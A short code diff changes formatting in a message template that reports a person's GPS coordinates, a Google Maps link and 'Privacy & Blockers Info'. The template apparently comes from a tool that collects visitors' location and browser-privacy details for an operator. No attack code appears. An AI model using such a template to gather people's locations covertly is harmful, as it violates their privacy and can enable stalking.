@@ -229,8 +229,8 @@ _𝙽𝚘𝚝𝚎: 𝙸𝙿-𝚋𝚊𝚜𝚎𝚍 𝚕𝚘𝚌𝚊𝚝𝚒𝚘�
 
 📌 *GPS:*
 - Status: ${geoResult.status}
-- Latitude: ${geoResult.latitude}
-- Longitude: ${geoResult.longitude}
+- Latitude: \`${geoResult.latitude}\`
+- Longitude: \`${geoResult.longitude}\`
 - Map View: https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}
 
 🔐 *Privacy & Blockers Info:*
